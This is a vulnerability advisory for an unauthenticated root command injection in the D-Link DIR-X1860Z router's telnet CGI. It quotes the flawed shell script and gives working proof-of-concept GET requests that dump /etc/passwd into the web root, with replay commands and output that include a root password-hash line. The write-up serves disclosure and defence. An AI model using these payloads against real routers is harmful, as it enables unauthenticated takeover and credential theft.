## DIR-X1860Z Vulnerability

Vendor:D-Link

Product:DIR-X1860Z (EAGLE PRO AI, ZXIC SoC · also affects DIR-X3000Z)

Version:V1.0.7.260821.161908 (latest, 2026-08-21)

Download:https://support.dlink.com → DIR-X1860Z → `DIR-X1860Z_V1.0.7.260821.161908_UPGRADE_ALL.bin` (sha256 630404424ae1825ae53a27228bd58f3f97b0372c8bee181a061bf3ff2a40adfa)

Vulnerability:Unauthenticated OS Command Injection (pre-auth RCE, root) — CWE-78

Author:Chauncy-lab

## Descriptions

We found an unauthenticated command injection vulnerability in the `telnet` shell CGI (`/www/cgi-bin/telnet`) executed by the firmware's stock `uhttpd` (`-x /cgi-bin`).

The CGI parses `QUERY_STRING` itself. A `urldecode()` helper whose *stated purpose* is "handle command injection" strips all shell metacharacters — but the only call to it (line 21) is commented out. The parsing loop then feeds **both** the parameter name and the value, completely unsanitized, into a raw `eval`:

```sh
#!/bin/sh

#urldecode and handle command injection        <-- helper exists...
...
                str=${str//[\"\'\`|\\<>@?*~!();,.]/}   <-- ...and strips metacharacters
#handle query string
#QUERY_STRING=`urldecode "$QUERY_STRING"`      <-- BUG: the ONLY call is commented out
while [ true ]; do
	param=${QUERY_STRING%%&*}
	QUERY_STRING=${QUERY_STRING#*&}
	val=${param#*=}
	key=${param%=*}
	eval "${key}='${val}'"     <-- raw eval: key & value fully attacker-controlled
	if [ "$param" = "$QUERY_STRING" ] || [ ${#param} -le 0 ]; then
		break
        fi
done

ubus call system set_telnet "{\"AuthUser\":\"$user\",\"AuthPwd\":\"$pwd\",\"Enable\":$enable}"
```

Line 27 executes `eval "${key}='${val}'"` for every `k=v` pair, so:

* **Vector 1 — value quote-breakout**: any value containing `'` closes the quoting and `;` starts a new command → `user=';cat /etc/passwd>/www/rce_q;'` is evaluated as `user='';cat /etc/passwd>/www/rce_q;''`;
* **Vector 2 — name command substitution**: a *name* containing `$(cmd)` is executed at `eval` parse time → `$(cat /etc/passwd>/www/rce_k)=1`.

There is **no authentication anywhere** in the script (no sid/session/cookie check), and `uhttpd` runs as root — a single LAN-side GET request yields unauthenticated root code execution. Note that `uhttpd` passes `QUERY_STRING` through verbatim per the CGI spec, so payloads must be sent as raw characters (no %-encoding; `${IFS}` replaces spaces) — this is why the PoC below uses a raw socket.

The sibling CGI `upgrade` (same directory) contains the same `eval` loop but its `urldecode` call at line 52 is **active**, which strips `"'`|\<>@?*~!();,.` — proving the telnet variant is a "commented-out security check" regression, not an intended design.

### Affected Versions (md5 of /www/cgi-bin/telnet)

| Model / Version | md5 | Status |
|---|---|---|
| DIR-X1860Z V1.0.7.260821.161908 | `5a85bad67a38ccc515c9ddec7c903fbd` | **affected** (this finding, latest build) |
| DIR-X3000Z V1.0.3.250716 | `5a85bad67a38ccc515c9ddec7c903fbd` | **affected** (byte-identical file) |
| DIR-X3000Z V1.0.3.260916 | `b7f64829c5afe9fc65f735a89951d3cc` | fixed (silently rewritten to a whitelist `sanitize()`, no advisory) |

D-Link's advisory SAP10513 (2026-08-26, CVE-2026-94036/94050) fixes two *unrelated* `/ubus` defects **in this very version** — the telnet CGI flaw is not covered by any published CVE.

Suggested CVSS v3.1: `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (8.8, root RCE from a single LAN packet).

## Proof of Concept (PoC) — verbatim replay capture (2026-11-13)

Both vectors are single raw-socket GETs — no URL-encoding (uhttpd passes `QUERY_STRING` through verbatim, `${IFS}` replaces the space), no credentials anywhere. The injected command dumps a system file (`cat /etc/passwd`) into the web root, from where it is served over HTTP.

**Request — vector 1, value quote-breakout (103 bytes):**

```text
GET /cgi-bin/telnet?user=';cat${IFS}/etc/passwd>/www/rce_q;'&enable=false HTTP/1.0
Host: 127.0.0.1
```

**Response (139 bytes):**

```text
HTTP/1.0 200 OK
Connection: close
Content-type: html

<html>
	<head>
		<title>telnet</title>
	</head>
	Failed to close telnet!
</html>
```

**Request — vector 2, name command substitution (86 bytes):**

```text
GET /cgi-bin/telnet?$(cat${IFS}/etc/passwd>/www/rce_k)=1 HTTP/1.0
Host: 127.0.0.1
```

**Response (139 bytes):** identical to the response above.

The HTML ("Failed to close telnet!") is the CGI's normal output — the injected command has already run before it (verified below).

## Overcome

Fresh full replay on 2026-11-13 against the emulation container `verify_0149_x1860z` (stock ARM `uhttpd` + firmware busybox via binfmt-chained qemu, port 8149; container clock is UTC). Each step lists the **executed command(s)** and their **verbatim output** in separate blocks.

**Step 1 — markers deleted before the run (nothing pre-exists)**

Command:

```sh
docker exec verify_0149_x1860z sh -c 'rm -f /qemu_arm/work/www/rce_* ; ls /qemu_arm/work/www/rce_* 2>&1'
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8149/rce_q
```

Output (in command order):

```text
ls: cannot access '/qemu_arm/work/www/rce_*': No such file or directory
404
```

(Both lines are the **intended** result of this check: the marker file does not exist on disk (`ls` finds nothing) nor on the web server (`404` = Not Found). This is the "before" picture — contrast it with Step 3, where the same URL returns `200` with the dumped `/etc/passwd`.)

**Step 2 — send the two requests shown in the PoC section above** (both answered `HTTP/1.0 200 OK` with the 139-byte HTML).

**Step 3 — effect: the injected `cat` executed with root privileges and its output is downloadable from the docroot**

Command:

```sh
curl -s http://127.0.0.1:8149/rce_q
curl -s http://127.0.0.1:8149/rce_k
docker exec verify_0149_x1860z sh -c 'ls -la /qemu_arm/work/www/rce_*'
```

Output (first two lines of the dump shown verbatim — both URLs return the identical 42-line, 1884-byte file; then the `ls` result):

```text
root:$1$$VgLV9ayr7ocYvak7sJ0HB/:0:0:root:/root:/bin/sh
cpktest:x:1121:0:cpktest:/usr/data/c_ins/com.chinatelecom.zhongxing.smartgateway.cpktest:/bin/sh
... (42 lines in total: the complete /etc/passwd, including the root password-hash field)

-rw-rw-rw- 1 root root 1884 Nov 13 06:01 /qemu_arm/work/www/rce_k
-rw-rw-rw- 1 root root 1884 Nov 13 06:01 /qemu_arm/work/www/rce_q
```

Both files are 1884 bytes and owned by `root`: a single unauthenticated GET executed an arbitrary command as root, and the command's output was exfiltrated over plain HTTP.
